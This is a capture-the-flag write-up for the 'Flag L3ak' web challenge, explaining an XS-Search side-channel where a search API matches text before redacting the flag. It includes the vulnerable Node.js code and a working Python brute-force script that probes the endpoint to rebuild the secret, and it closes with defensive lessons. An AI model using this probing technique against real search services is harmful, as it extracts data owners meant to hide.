---
title: "L3AK25: Writeup for Web/Flag-L3ak"
date: 2025-07-14T09:31:01+01:00
tags: ["ctf", "write-up", "l3ak"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Flag L3ak"
summary: "The application is vulnerable to a side-channel attack known as XS-Search, a subclass of XS-Leaks. By observing differences in server responses based on 3-character search queries, we reconstructed the flag one character at a time."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Overview

* CTF: L3AK CTF 2025
* Challenge: Flag L3ak
* Category: Web Exploitation
* Points: 50 (698 solves)
* Description:

> What's the name of this CTF? Yk what to do 😉

![challenge description](/blog/images/2025-07-14-12-27-13.png)

* Author: [p._.k](https://discord.com/users/1267886144306282621)

[Challenge source (will update this when the ctf ends for reproducibility)](https://ctf.l3ak.team/files/a753e930cce5e57819041baba8c40dcd/flag_l3ak.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo0N30.aHTFkA.tJCqyTOLb1ZKlvP2QqdFxosJAcI)

## TL;DR

The application is vulnerable to a side-channel attack known as XS-Search, a subclass of XS-Leaks. By observing differences in server responses based on 3-character search queries, we reconstructed the flag one character at a time.

 The leak occurs due to redacted content masking the real flag but not filtering it out entirely, allowing us to detect its presence via a simple YES/NO oracle.

## Initial Analysis

![web application showcase](/blog/images/l3ak25/flag-l3ak-showcase.gif)

At first glance, this is a simple blog-style website. You can search blog posts, and if a post matches your query, it shows up.

While testing the search, a suspicious post titled `Real flag fr` with a decoy flag (`L3AK{Bad_bl0g?}`) shows up.
It's obviously a decoy and I was met with **"Flag incorrect"** on CTFd.

More interestingly though, another post contains redacted content - a string of asterisks (*). This might hint that our query matches the real flag but the characters are hidden.

Let's confirm that by reading the source.

### `Project structure`
```bash
.
├── Dockerfile
├── index.js
├── package.json
├── package-lock.json
└── public
    └── index.html

2 directories, 5 files
```

### Key Code: `index.js`
```js
const FLAG = 'L3AK{t3mp_flag!!}';

...

app.post('/api/search', (req, res) => {
    const { query } = req.body;

    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ error: 'Query must be 3 characters.' });
    }

    const matchingPosts = posts
        .filter(post =>
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
        }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query
    });
});
```

We observe the following:

1. Search is restricted to 3-character queries.
2. Matching happens on full content, but redaction (*) happens after the match.
3. The flag is still matched, just hidden on display, just like this:

```js
.map(post => ({
    ...post,
    content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
}));
```

This means we can’t *see* the flag, but we can **detect its presence**. Let's check
the challenge description again: what's the name of the CTF, leak it is. Mhmmm~

## Task Analysis

The discrepancy between redacted (but matched) content and completely absent content gives us an oracle:

> “Is this 3-character substring part of the real flag?”

{{< notice tip >}}
an oracle refers to a mechanism that reveals binary (YES/NO) information about a question. If we ask a YES or NO question
and can receive a response, we call that an oracle.
{{< /notice >}}

By sliding a 3-character window across a partially guessed flag prefix (L3AK{), we can confirm or reject each new character.

This is a classic [XS-Leak](https://xsleaks.dev/), where the attacker observes side-channel differences (not the actual data) to reconstruct a secret.

### XS-Leaks Overview

Cross-Site Leaks (XS-Leaks) are vulnerabilities where attackers infer private information by observing application behavior (response times, redirects, error codes, or even content shapes) without ever accessing the data directly.

In our case, the oracle is binary:

* If a redacted string appears (********), the queried 3-char substring is part of the flag.
* If the result is empty, it’s not.

![xs-leaks expalanatory picture](/blog/images/2025-07-14-12-38-19.png)

### XS-Search (Our Case)

This specific subclass of XS-Leaks is known as XS-Search.

Web applications often support search endpoints, and if those endpoints leak differences in behavior for private vs. public data, attackers can extract secrets via **controlled probing**.

In our case, the shape of the JSON response reveals whether a 3-character probe is valid:

#### Response when match is found (includes redacted flag):

```json
{
    "results": [
        {
            "id": 3,
            "title": "Not the flag?",
            "content": "Well luckily the content of the flag is hidden so here it is: ************************",
            "author": "admin",
            "date": "2025-05-13"
        },
        {
            "id": 4,
            "title": "Real flag fr",
            "content": "Forget that other flag. Here is a flag: L3AK{Bad_bl0g?}",
            "author": "L3ak Member",
            "date": "2025-06-13"
        }
    ],
    "count": 2,
    "query": "L3A"
}
```

#### Response when no match:

```json
{"results":[],"count":0,"query":"K{X"}
```

> There is also a decoy flag (in `post.id == 4`) that is not redacted. To avoid false positives, we only treat hits containing * as real.

## Exploitation

Armed with our oracle, we brute-force the flag as follows:

1. Establish a baseline of the response content where a hit occurs ('*' in the json)
2. brute-force the first charcter after `known` (query = L3AK{**a**)
3. If the response is a hit, then add one more character (?q=L3AK{a**a**); otherwise try a new one (?q=L3AK{**b**).
4. In the end, a full flag (?q=L3AK{flag_here}) can be leaked.

Like this:
```python
#!/usr/bin/env python3

import string
import requests

URL = 'http://34.134.162.213:17000/api/search'

alphabet = string.printable.strip()
known = 'L3AK{'

print(f"[+] Starting brute-force with prefix: {known}")

while not known.endswith('}'):
    found = False
    for c in alphabet:
        probe = (known + c)[-3:]
        r = requests.post(URL, json={"query": probe})
        data = r.json()

        # Filter out decoy match (like post id 4) by checking for masked content
        for post in data.get('results', []):
            if '*' in post['content']:
                print(f"[+] Match found via mask for '{probe}' → adding '{c}' to flag")
                known += c
                found = True
                break

        if found:
            break

    if not found:
        print("[-] No matching character found: maybe charset is wrong or flag ended.")
        break

print(f"\n✅ Final reconstructed flag: {known}")
```

![web application showcase](/blog/images/l3ak25/leaking-flag.gif)

Flag is: `L3AK{L3ak1ng_th3_Fl4g??}`

## Conclusions

* Redacting sensitive data *without removing* it from search logic introduces oracles.
* Even seemingly harmless APIs (like search) can leak secrets via side-channels.
* XS-Leaks can be exploited without authentication or special privileges.
* Always apply redaction before matching, or remove sensitive data from queries entirely.
* Validating response shape consistency is crucial when designing secure APIs.

## References

1. [xsleaks.dev](https://xsleaks.dev/): The canonical guide to XS-Leaks and browser side-channels.
2. [XS-Search (xsleaks.dev)](https://xsleaks.dev/docs/attacks/xs-search/): Specific pattern used in this challenge.
3. [string.printable – Python Docs](https://docs.python.org/3/library/string.html#string.printable): Charset used in the brute-force script.


